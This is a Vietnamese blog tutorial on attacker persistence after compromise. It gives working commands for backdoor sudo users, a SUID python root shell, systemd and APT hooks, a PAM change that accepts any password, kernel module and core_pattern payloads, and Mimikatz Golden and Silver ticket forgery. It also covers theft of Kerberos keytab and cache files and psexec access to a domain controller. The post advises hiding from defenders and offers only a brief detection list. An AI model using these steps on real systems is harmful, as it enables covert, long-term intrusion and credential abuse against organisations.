![](https://images.viblo.asia/d604608d-fbe0-4cb4-92c4-89daf22c75ec.png)
# 1. Persistence là gì ?
Theo nguyên nghĩa tiếng Anh : 
![](https://images.viblo.asia/0b1f7613-8181-4562-b6ba-df117858de4c.png)

Theo nghĩa kỹ thuật : Chúng ta tìm hiểu một mô hình mình bịa ra như sau :

![](https://images.viblo.asia/274841f1-2e62-4e58-8315-283addcbb651.png)

Mô hình này mô tả con đường tấn công của một Hacker vào một cơ quan hay tổ chức. Theo đó, Hacker đứng từ Internet sau đó chiếm quyền điều khiển được máy A , từ máy A ->  B, từ máy B -> C , từ máy C -> DC (Domain Controller) chuyện không có gì đáng nói. 

Nhưng vấn đề bắt đầu xảy ra vào ngày thứ 2, khi lỗ hổng đã được khắc phục ở máy A (hay ông ngồi ở máy A không click vào mã độc nữa) thì khi này mọi nỗ lực tấn công vào máy B , máy C hay DC đều bị vô hiệu. Lúc này Hacker cần một con đường tắt từ Internet sang máy C hoặc thậm chí là DC (hoặc cả 2) để không còn phụ thuộc toàn bộ vào máy A và máy B nữa. Quá trình này được gọi là *Persistence*.

Hay trường hợp khác khi bạn cài đặt được mã độc vào máy người khác (dĩ nhiên là cho mục đích giáo dục) bạn phải đảm bảo mã độc của mình luôn được giữ ở trạng thái "sống" một cách tối đa .Quá trình này cũng được gọi là  *Persistence*.

Persistence hoạt động ở các môi trường khác nhau cho những phương thức và kết quả khác nhau. Chúng ta cùng đi qua từng danh mục để tìm hiểu tường tận về kỹ thuật vô cùng thú vị này. 

# 2. Linux Persistence

Ngữ cảnh đặt ra là chúng ta đã có đặc quyền root trên một Server chạy HĐH Linux sau đó sử dụng tất cả các cách thức để duy trì sự hiện diện về lâu dài. Ở đây ta có thể áp dụng 1-2 hoặc kết hợp tất cả các kỹ thuật persistence . Càng kết hợp nhiều khả năng duy trì "tính bền bỉ" càng cao nhưng đồng thời nguy cơ bị phát hiện cũng càng lớn. 
 
### Add a root user

Đây là kỹ thuật đơn giản nhất mà chúng ta thường bỏ qua trong quá trình tấn công. Thông thường sau khi chiến quyền điều khiển hệ thống, ta không nên đổi mật khẩu của bất cứ User nào. Việc mật khẩu bỗng dưng thay đổi là lý do không thể hợp lý hơn cho đội ngũ Blue Team rà soát lại an ninh máy chủ. Thay vào đó, ta nên thêm các user độc hại mới nhưng núp dưới những cái cái tên vô hại như mysql, guest , lightdm .. (User mới không trùng với các User hiện diện trước đó trên hệ thống) 

```bash
sudo useradd guest
sudo usermod -aG sudo guest
```
 
### Persistence with suid Binary 

Kỹ thuật này cho phép chúng ta tạo ra một lỗ hổng bảo mật hệ thống, từ đó giúp ích cho quá trình leo thang đặc quyền về sau này. Có nhiều chương trình có thể tận dụng để leo thang với suid mà ta có thể tham khảo ở [đây](https://gtfobins.github.io/#+suid) . Ví dụ ta lấy `python3` làm điển hình

```bash
 sudo chmod +s /usr/bin/python3
```
Lần tới khi xâm nhập vào hệ thống, khi muốn leo thang lên đặc quyền root ta chỉ cần thực thi command sau

```bash
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
### Persistence with Crontab

Crontab là một trợ thủ đắc lực cho SYSTEM ADMIN trong việc quản lý schedule tasks. Nhưng đồng thời ta cũng có thể lợi dụng nó cho mục đích Persistence bằng cách ghi đè các tệp tin độc hại và ép chương trình chạy định kỳ theo ý muốn như một chương trình bình thường. 

Để cấu hình Crontab đúng cách, ta có thể tham khảo theo hướng dẫn [sau](https://www.cyberciti.biz/faq/how-do-i-add-jobs-to-cron-under-linux-or-unix-oses/) 

### Persistence with  startup service

Persistence thông qua startup service mà một kỹ thuật dễ thực hiện nhưng lại vô cùng hiệu quả với tỉ lệ phát hiện rất thấp. Đây cũng là phương pháp yêu thích của mình khi muốn duy trì kết nối với mục tiêu. Để tạo một startup service file, chúng ta có thể tham khảo template sau

```bash 
[Unit]
Description=Example systemd service.

[Service]
Type=simple
ExecStart=/bin/bash /usr/bin/test_service.sh

[Install]
WantedBy=multi-user.target
```

Trong đó tham số `ExecStart` là đường dẫn tới file command mà chúng ta muốn thực thi . Sau khi tạo khởi tạo startup file, chúng ta tiến hành enable và start Service  

```
sudo systemctl enable fileservice 
sudo systemctl start fileservice
```

Như vậy các command độc hại sẽ tự động thực thi ngay cả khi người dùng tiến hành khởi động lại máy 
.

### Persistence with PAM

Linux Pluggable Authentication Modules hay PAM là một bộ thư viện được sử dụng mặc định trong Linux cho phép quản trị viên hệ thống cấu hình các phương pháp để yêu cầu xác thực người dùng. Kỹ thuật này cố ý cấu hình sai PAM dẫn tới hư hỏng cơ chế xác thực của hệ thống. 

**Bước 1**. Cấu hình PAM 
```
sudo nano /etc/pam.d/common-auth
```

```
#
# /etc/pam.d/common-auth - authentication settings common to all services
#
# This file is included from other service-specific PAM config files,
# and should contain a list of the authentication modules that define
# the central authentication scheme for use on the system
# (e.g., /etc/shadow, LDAP, Kerberos, etc.).  The default is to use the
# traditional Unix authentication mechanisms.
#
# As of pam 1.0.1-6, this file is managed by pam-auth-update by default.
# To take advantage of this, it is recommended that you configure any
# local modules either before or after the default block, and use
# pam-auth-update to manage selection of other modules.  See
# pam-auth-update(8) for details.

# here are the per-package modules (the "Primary" block)
auth    [success=1 default=ignore]      pam_unix.so nullok
# here's the fallback if no module succeeds
auth    requisite                       pam_deny.so
# prime the stack with a positive return value if there isn't one already;
# this avoids us returning an error just because nothing sets a success code
# since the modules above will each just jump around
auth    required                        pam_permit.so
# and here are more per-package modules (the "Additional" block)
# end of pam-auth-update config
```
Ở đây  ta thấy PAM sử dụng nhiều library, nhưng đáng chú ý có 2 library **pam_deny.so (từ chối)**  và **pam_permit.so (cho phép)**  

**Bước 2** Sửa file cấu hình PAM 

Tiến hành thay đổi cấu hình sau 

```bash
# here are the per-package modules (the "Primary" block)
auth    [success=1 default=ignore]      pam_unix.so nullok
# here's the fallback if no module succeeds
auth    requisite                       pam_deny.so
```
Thành 

```bash
# here are the per-package modules (the "Primary" block)
auth    [success=1 default=ignore]      pam_unix.so nullok
# here's the fallback if no module succeeds
auth    requisite                       pam_permit.so
```

Kết quả phương thức xác thực của Server đã bị thay đổi , người dùng có thể đăng nhập vào hệ thống (Local hay Remote Login) bằng bất cứ mật khẩu nào (bao gồm cả mật khẩu rỗng). 

### Persistence with APT (Ubuntu/Debian)

Persistence với APT cho phép các command độc hại hoạt động mỗi khi người dùng sử dụng APT cho mục đích cài đặt hay update hệ thống.  Ta cấu hình như sau :

```bash
echo 'APT::Update::Pre-Invoke {"echo "test" > /tmp/hacked.txt"};' > /etc/apt/apt.conf.d/file
```

![](https://images.viblo.asia/37cdacd4-3c58-4ea5-8d15-a926420e37f4.png)

Command sẽ tự động thực thi khi người dùng tiến hành update hệ thống 

![](https://images.viblo.asia/8de999b6-822c-4252-bf2f-7f0ce6096326.png)

### Persistence with Kernel Driver 

Persistence thông qua Kernel Driver là một kỹ thuật tương đối phức tạp nhưng nếu thực hiện thành công thì tỉ lệ bị phát hiện gần như bằng 0%. Rất đáng để chúng ta thử 

Đầu tiên, chúng ta xem qua một mô hình Linux Kernel như sau :

![](https://images.viblo.asia/a508360a-3e70-4b96-9919-837019fb661c.png)

Ở đây ta thấy 3 thành phần Linux Kernel bao gồm Kernel , Kernel modules và System Libraries với các vai trò và mục đích sử dụng khác nhau. Để tìm hiểu kỹ hơn về chúng, ta có thể tham khảo bài viết [sau](https://linux-kernel-labs.github.io/refs/heads/master/lectures/intro.html) . Trong khuôn khổ bài viết về Persistence ta có thể lợi dụng đồng thời cả 3 để phục vụ mục đích của mình

* Với Kernel - Ta có thể trực tiếp chèn code độc hại của mình sau đó biên dịch lại.Tuy nhiên cách này rất tốn thời gian và công sức lại dễ gây hư hỏng hệ thống nếu chúng ta cấu hình không đúng cách.
* Với System Libraries - Để thực hiện  bạn có thể tham khảo một [bài viết](https://viblo.asia/p/share-libraries-hijacking-tren-linux-gAm5yEVX5db) khác của mình 

Với Kernel Module ta tiến hành thực hiện theo các bước sau :
 
**Bước 1** . Tạo module độc hại với ngôn ngữ C

![](https://images.viblo.asia/7c55db75-620f-4e1e-998f-d3e6534009da.png)

![](https://images.viblo.asia/81b7aa24-11ea-4ce2-983a-8df267a7e635.png)


**Bước 2**. Biên dịch và insert module vào Linux Kernel

![](https://images.viblo.asia/a6b1438b-7776-4bc1-8835-1b7f1b10ca1c.png)

![](https://images.viblo.asia/8a489e2e-50d5-400f-b5cc-f0d3be21bab7.png)

**Bước 3**. Module thực thi khi được call 

![](https://images.viblo.asia/7bfe63c2-7dbf-436e-9d96-53f0dd73dca4.png)

### Persistence with Kernel core pattern

Trên các máy chủ Linux, khi một chương trình bị crash  (core dump) nó sẽ gọi ra một thông báo thông qua một chương trình với tên gọi core_pattern. Lợi dụng điều này ta có thể chèn và thực thi mã độc của mình.

Xem qua tài liệu sử dụng của Core pattern như sau :

![](https://images.viblo.asia/9d73dc88-b3bd-46f2-9972-b7e05eec4c57.png)


Ở dòng cuối ta thấy , trong trường hợp một chương trình bị crash nó sẽ call tới core_pattern nhưng nếu trong cấu hình của core_pattern có chứa ký tự "|" thì nó sẽ coi cấu hình đó như  một command và sẽ thực thi ngay. Đó chính là thứ ta có thể lợi dụng cho mục đích persistence.

Ta thực hiện theo các bước sau  :

**Bước 1**. Tạo payload độc hại

```bash
root@client2:/tmp# cat poc.sh
echo 1111 > /tmp/poc.txt
root@client2:/tmp#
```

**Bước 2**. Cấu hình core pattern

![](https://images.viblo.asia/22b8c079-1883-4238-a18d-7bc5a7ea49e9.png)

**Bước 3**. Làm một chương trình bị crash để thực thi payload độc hại

![](https://images.viblo.asia/4c51e349-54e0-4bf1-9a23-5e066f9d27cf.png)

### Persistence with udev device 

Để hiểu hơn về phương pháp này, các bạn có thể tham khảo video dưới dây https://drive.google.com/file/d/1ypSJzMYZlScwu7hJXcfXRRHNPBdRk2NZ/view 

Ý tưởng đặt ra là việc ta lợi dụng hành động người dùng cắm các thiết bị ngoại vi như chuột , bàn phím , Webcam, USB ... để thực thi mã độc hại. 

# 3. Active Directory Persistence - Windows

## 3.1. Golden Ticket

![](https://images.viblo.asia/22fcf1fa-2725-4d13-a1f4-8469c7d7459a.jpg)

### Khái niệm
  
Golden Ticket là cuộc tấn công mà Hacker sử dụng để tạo ticket giả mạo thông qua việc chiếm đoạt được *password hash* của account KRBTGT (Kerberos Service) trong Active Directory. Golden Ticket không trực tiếp khai thác lỗ hổng hệ thống mà giúp kẻ tấn công có thể truy cập lén lút về sau.

Cùng nhau xem qua một bức ảnh mà mình ăn trộm được ở trên mạng :

![](https://images.viblo.asia/a752d8c5-e4f6-471b-b70e-dcc980e964f0.png)

Ở đây ta thấy Golden Ticket được trực tiếp sign bằng TGT (B1-2) , do đó nó có thể giả mạo bất kỳ tài khoản nào trong Domain để tiến hành đăng nhập. Các yếu tố tiên quyết để có thể pha chế ticket giả mạo bao gồm : SID , Domain Name , KRBTGT account hash

Các bước thực hiện:

* Hacker chiếm được đặc quyền quản trị trên Active Directory từ đó extract KRBTGT account's password hash. Đồng thời tìm kiếm thêm các thông tin về "Domain name" và SID 
* Sử dụng Mimikatz để tạo tiket giả mạo 
* Sử dụng ticket giả mạo - lúc này đã được gọi là một tấm vé vàng để truy cập vào nguồn tài nguyên Active Directory 


### Môi trường

* Window Server 2019 (Domain Controller)

* Windows 10 Client 

* Domain *SUN-ASTERISK.LOCAL*

### Khai thác  

**Bước 1**: Truy cập vào DC với đặc quyền cao nhất 

**Bước 2**: Sử dụng Mimikatz - dump KRBTGT account hash

```bash
mimikatz # lsadump::lsa /inject /name:krbtgt
```

[![URlScreenshot_1.png](https://0xbadcode.ml/uploads/images/gallery/2022-02/scaled-1680-/URlScreenshot_1.png)](https://0xbadcode.ml/uploads/images/gallery/2022-02/URlScreenshot_1.png)

**Bước 3**: Từ ba thông tin có được bao gồm SID, Domain Name, Hash password KRBTGT ta tiến hành sử dụng Mimikatz để tạo ticket giả mạo

```bash
mimikatz # privilege::debug

mimikatz # kerberos::golden /domain:sun-asterisk.local /sid:S-1-5-21-709047218-2687610627-1811081816 /rc4:3ff064ff65e171047fb5395079b8664e /user:newAdmin /id:500 /ptt
```

[![INSScreenshot_2.png](https://0xbadcode.ml/uploads/images/gallery/2022-02/scaled-1680-/INSScreenshot_2.png)](https://0xbadcode.ml/uploads/images/gallery/2022-02/INSScreenshot_2.png)

Ở đây ta thấy một ticket được tạo cho account *newAdmin* với ID là 500. Tuy nhiên trên thực tế không hề có account này trên hệ thống

[![XWkScreenshot_3.png](https://0xbadcode.ml/uploads/images/gallery/2022-02/scaled-1680-/XWkScreenshot_3.png)](https://0xbadcode.ml/uploads/images/gallery/2022-02/XWkScreenshot_3.png)

[![WHlScreenshot_4.png](https://0xbadcode.ml/uploads/images/gallery/2022-02/scaled-1680-/WHlScreenshot_4.png)](https://0xbadcode.ml/uploads/images/gallery/2022-02/WHlScreenshot_4.png)

File *ticket.kirbi* được tạo ra và lưu trữ trong thư mục *minikatz*

**Bước 4**: Sử dụng cuộc tấn công Pass-the-Ticket tiến hành truy cập trái phép Active Directory

### Cách phát hiện

Thông thường các cuộc tấn công Golden Ticket cực kỳ khó phát hiện và ngăn chặn do cơ chế hoạt động đặc biệt của nó. Việc phát hiện đòi hỏi người quản trị phải phân tích Kerberos  Ticket để tìm ra các dấu hiệu gian lận bao gồm :
* Tên người dùng không tồn tại
* Tên người dùng và RID không khớp
* Sử dụng mã hóa yếu hơn RC4 thay vì AES-256
* Thời gian sử dụng của ticket quá lớn (kiểu kiểu 10 năm) so với mặc định (8-10 giờ)

## 3.2. Silver Ticket

![](https://images.viblo.asia/d29f1a06-7846-493b-b8bf-78ca14b69011.jpg)

### Khái niệm

Silver Ticket có ngữ cảnh hoạt động giống như Golden Ticket chỉ khác thành phần được sign giữa chúng có sự khác nhau. Nếu Golden Ticket được TGT (Ticket Granting Ticket) sign do đó có quyền hạn tối đa trong một domain thì Silver Ticket chỉ được TGS (Ticket Granting Service) sign, do đó nó chỉ được giới hạn ở mức độ Service Account của hệ thống. Tuy mức độ nguy hiểm thấp hơn nhưng Silver Ticket được nhận định là khó phát hiện hơn GT rất nhiều. 

### Khai thác 

**Bước 1** . Sử dụng *Mimikatz* tiến hành dump thông tin hệ thống đồng thời thu thập thông tin về Domain (SID) 

```
PS> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

Authentication Id : 0 ; 73892 (00000000:000120a4)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/4/2022 9:57:08 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : DESKTOP-P3JAFPO$
         * Domain   : SUN-ASTERISK
         * NTLM     : 234b644f98e24ee35d6b013471baafec
         * SHA1     : d76b8012a9e1b9d25af4fb44f1e3c5b59cb9f6f0
        tspkg :
        wdigest :
         * Username : DESKTOP-P3JAFPO$
         * Domain   : SUN-ASTERISK
         * Password : (null)
        kerberos :
         * Username : DESKTOP-P3JAFPO$
         * Domain   : sun-asterisk.local
         * Password : ?h#a9Do"Bp'Qx"j<[(fMJ3hW!$@.>PR@_Q>%YlBr+3&;ir=s79pYNK#Xc<XZ>93BUSdB5tn>X3eQ&1*D Sa$x<khJn4$O^'G+sq9;Yxom@8gxAQzdEC 22>3
        ssp :   KO
        credman :
```
![](https://images.viblo.asia/8306fe57-59c3-4379-862b-071d50159e17.png)

![](https://images.viblo.asia/7931c225-178a-4ca8-8917-ca15edc61d0a.png)

**Bước 2**. Với những thông số đã biết ta tiến hành tạo Silver Ticket 

```powershell 
kerberos::golden /user:TestAccount /domain:sun-asterisk.local /sid:S-1-5-21-2870076815-1837430691-1583567094 /rc4:8fbe632c51039f92c21bcef456b31f2b /target:WIN-88J4SON16QR.sun-asterisk.local /service:cifs /ptt" "misc::cmd
```
![](https://images.viblo.asia/75b5c842-c86e-4bc7-b00f-2a53cab274bd.png)

Các thông số được giải thích như sau :
```
* /domain — Active Directory domain
* /sid —  SID của Active Directory domain
* /user — The username to impersonate
* /target — The fully qualified domain name of the server
* /service — The target service name
* /rc4 — The NTLM/RC4 password hash
```

**Bước 3** Sử dụng Silver Ticket đã tạo, tiến hành truy cập vào hệ thống

```powershell 
PS> Find-InterestingFile -Path \\WIN-88J4SON16QR.sun-asterisk.local\S$\shares\
 
FullName       : \\WIN-88J4SON16QR.sun-asterisk.local\S$\shares\test.txt 
Owner          : DOMAIN\JOED
LastAccessTime : 21/10/2022 5:42:44
LastWriteTime  : 21/10/2022 5:42:44
CreationTime   : 20/10/2021 4:24:50
Length         : 43
 
PS> Copy-Item -Path "\\WIN-88J4SON16QR.sun-asterisk.local\S$\shares\test.txt" -Destination "C:\Windows\Temp\test.txt"
PS>
```
# 4. Active Directory Persistence - Linux

### Môi trường

* Window Server 2019 (Domain Controller) - Hostname *DC02.SUN.LOCAL*
* Debian 11 (64bit)  - Hostname *HR2.SUN.LOCAL*
* Domain *SUN.LOCAL*
* Account *minhtuan@sun.local* , *quandao@sun.local*


### Kerberos trên Linux

Kerberos là một tùy chọn nổi tiếng để xác thực trên Windows AD nhưng nó cũng có thể được sử dụng trên Linux thông qua KDC riêng dành cho Linux. Ngoài ra Linux client cũng có thể xác thực với các máy chủ Active Directory thông qua Kerberos như một máy Windows. 


Ở thiết lập này, ta thấy tài khoản **minhtuan** được join vào domain sun.local . Người dùng AD có thể đăng nhập vào **hr.sun.local** lab thông qua thông tin tài khoản của họ

![](https://images.viblo.asia/4a31fff6-1702-4f06-8a26-f53a51af58f2.png)


Active Directory members sử dụng Kerberos để xác thực được gán vào một tệp chứa thông tin xác thực. Vị trí của tệp này được đặt thông qua biến **KRB5CCNAME** của người dùng

Trong **hr.sun.local** lab , chúng ta có thể tìm thấy tệp tin này bằng cách "lọc" env

![](https://images.viblo.asia/cf915c4a-9f17-4508-91ef-f7b127459cb5.png)


Chúng ta sẽ note lại để sử dụng sau này 

```bash
KRB5CCNAME=FILE:/tmp/krb5cc_1526801109_jkRz4R 
```

Do Kerberos sẽ hết hạn sau một khoảng thời gian (thường là 8 tiếng). Do đó, để thuận tiện trong quá trình khai thác, chúng ta sẽ tạo ticket cho người dùng hiện tại trong AD 

Sử dụng **kinit** để lấy ticket (Do lấy ticket từ chính account hiện tại nên chúng ta không cần thêm tham số nào cả)

![](https://images.viblo.asia/174fe778-d522-4a8c-a7b5-b91ec6a63a90.png)


Sử dụng **klist** để liệt kê các ticket hiện tại được lưu trữ 

![](https://images.viblo.asia/8d9112eb-c530-44e9-944b-82794d600ecc.png)

Điều này cho thấy chúng ta đã có một ticket cấp cho administrator của SUN.LOCAL 

> Sử dụng kdestroy  nếu chúng ta muốn remove toàn bộ ticket đã lưu

Với ticket đã tạo, chúng ta có thể lấy danh sách Service Principal Names (SPN) có sẵn bằng cách sử dụng ldapsearch (Giống với cách sử dụng [GetUserSPNS.ps1](https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1) trên Windows)

```bash
ldapsearch  -H ldap://dc01.corp1.com -D "minhtuan@SUN.LOCAL" -W -b "dc=sun,dc=local" "servicePrincipalName=*" servicePrincipalName
```

![](https://images.viblo.asia/e60dc792-37c7-44bb-ad39-8280280d0471.png)

```bash
# IIS Admin 002, Users, sun.local
dn: CN=IIS Admin 002,CN=Users,DC=sun,DC=local
servicePrincipalName: IIS_002/dc02.sun.local:80

# krbtgt, Users, sun.local
dn: CN=krbtgt,CN=Users,DC=sun,DC=local
servicePrincipalName: kadmin/changepw

# MSSQLSvc, Users, sun.local
dn: CN=MSSQLSvc,CN=Users,DC=sun,DC=local
servicePrincipalName: MSSQLSvc/dc02.sun.local:1433

```

Yêu cầu một Ticket từ Kerberos cho MSSQL SPN ở trên với **kvno** (Giống với cách sử dụng [Get-TGSCipher.ps1](https://github.com/cyberark/RiskySPN/blob/master/Get-TGSCipher.ps1) trên môi trường Windows)


![](https://images.viblo.asia/8327afa5-3f31-476d-b956-e7e46a01157e.png)


Sau khi có ticket cho MSSQL ta có thể sử dụng dịch vụ này dưới vai trò người dùng đã xác thực  

### Đánh cắp - sử dụng Keytab File

Thông thường, để thực hiện các command tự động thay mặt người dùng truy cập vào tài nguyên AD hỗ trợ xác thực kerberos ta sử dụng keytab file chứa các thông tin đăng nhập được mã hóa. Điều này cho phép người dùng thực hiện các command xác thực thông qua Kerberros mà không cần dùng tới mật khẩu ( tương tự chúng ta tạo ra các tệp SSH Private Key, sau đó dùng nó để tự động xác thực với các máy khác)

Keytab file thường được sử dụng trong cron command. Chúng ta có thể kiểm tra nội dung của các tệp như /etc/crontab để xác định command nào đang được chạy và kiểm tra các command đó xem liệu chúng có đang được sử dụng để xác thực hay không. 

Sử dụng **ktutil** để tạo một keytab, phục vụ cho việc demo

![](https://images.viblo.asia/f6f10523-2d8d-4744-840c-562adfb911d4.png)

Các thông số được sử dụng như sau : 
* addent để thêm một keytab 
* -e cung cấp kiểu mã hóa
* wkt output của keytab (/tmp/quandao_backup.keytab)

Ngữ cảnh hiện tại local machine bị Hacker kiểm soát với đặc quyền root , Hacker truy cập được vào quandao_backup.keytab từ đó xâm nhập vào AD với đặc quyền user *quandao*. 

**Bước 1**. Tìm user đăng nhập thông qua keytab file

![](https://images.viblo.asia/913efbc9-3cfa-4d80-9523-5ecc82a4d0f5.png)

**Bước 2**. Sử dụng **kinit** để load keytab 

![](https://images.viblo.asia/e608fe2e-93a8-414e-a8be-643f9e0d66ac.png)


Nếu ticket hết hạn sử dụng, chúng ta sẽ không thể làm được gì tiếp. Tuy nhiên, nếu ticket nằm trong thời hạn sử dụng, chúng ta có thể gia hạn mà không cần nhập mật khẩu với **kinit -R**

![](https://images.viblo.asia/b844b819-7ae3-4d3a-a066-b7a276535534.png)

Thông thường với các hệ thống bảo mật yếu, keytab file sẽ được đặt với đặc quyền thấp cho phép Hacker dễ dàng truy cập và sử dụng

**Bước 3**. Truy cập vào ổ C$ của DC 

![](https://images.viblo.asia/d457fbf2-a748-4707-b995-d7d01aef33ce.png)

Ái chà, giòn đấy !!!

### Đánh cắp - sử dụng Cache Files 

#### Sử dụng Cache Files trên máy nạn nhân

Như đã đề cập trong phần trước, cache file lưu trữ thông tin xác thực Kerberos được đặt tại */tmp/krb5cc_1526801109_dhvnbh*. Tệp này thường chỉ có chủ sở hữu mới có thể truy cập được. Do đó, chúng ta không thể truy cập được vào file này nếu không có đặc quyền

![](https://images.viblo.asia/c7de30cb-77dc-420a-8eba-4f15f88b2004.png)


Tuy nhiên trong trường hợp file này được phân quyền không tốt hoặc bằng cách nào đó chúng ta có thể đọc được file này nhưng không có quyền truy cập vào Shell, chúng ta có thể lợi dụng nó để truy cập vào AD.

Sau khi đăng nhập vào tài khoản **quandao** và sở hữu cache file, chúng ta cần đặt biến môi trường **KRB5CCNAME** với value là đường dẫn tới Cache Files 
 
```bash
export KRB5CCNAME=/tmp/krb5cc_1526801109_dhnvbh
```

![](https://images.viblo.asia/b83c83c5-cb2b-4245-8114-4323897c7915.png)

Từ đây chúng ta có thể truy cập vào DC với quyền của user *quandao* mà không cần phải xác thực mật khẩu. 

#### Sử dụng Cache Files trên máy Hacker

Trong tình huống tới được mô tả trong phần này, chúng ta giả định rằng đã xâm nhập vào một server join Domain (hr2.sun.local) và lấy được cache file . Thay vì lợi dụng chính máy này để tấn công, chúng ta sẽ trực tiếp sử dụng impacket trên Kali để truy cập hệ thống 

Đầu tiên, chúng ta cần kéo cache file về máy với wget  (hoặc scp trong trường hợp các bạn sử dụng SSH)

![](https://images.viblo.asia/cdcc9761-131b-487d-9bd4-cd4a251f2544.png)

Cài đặt **krb5-user** 

```bash
sudo apt install krb5-user
```

Load Cache file vào Kali linux

```bash
export KRB5CCNAME=/tmp/krb5cc_1526801109_dhnvbh
```

[![fQVScreenshot_3.png](https://0xbadcode.ml/uploads/images/gallery/2022-05/scaled-1680-/fQVScreenshot_3.png)](https://0xbadcode.ml/uploads/images/gallery/2022-05/fQVScreenshot_3.png)

Do trong quá trình sử dụng, chúng ta sẽ sử dụng domain **SUN.LOCAL** và **DC02.SUN.LOCAL** nên ta tiến hành add chúng vào /etc/hosts 

![](https://images.viblo.asia/e051ad0e-eeb5-45d1-a666-1455c139f739.png)

Sử dụng [impacket-psexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) tiến hành login vào DC 

```bash
 python3 /usr/share/doc/python3-impacket/examples/psexec.py minhtuan@DC02.CORP1.COM -k -no-pass
```

![](https://images.viblo.asia/d8abd9d6-3e10-4e89-95dd-e28592830ec4.png)

# 5. Tổng kết

Như vậy là ta đã cùng đi qua các kỹ thuật Persistence tương đối thông dụng và cơ bản ở nhiều môi trường khác nhau. Hẹn mọi người  ở phần 2, chúng ta sẽ cùng tìm kiểu các kỹ thuật Persistence nâng cao hơn trong Windows và  Linux. Cảm ơn mọi người dã theo dõi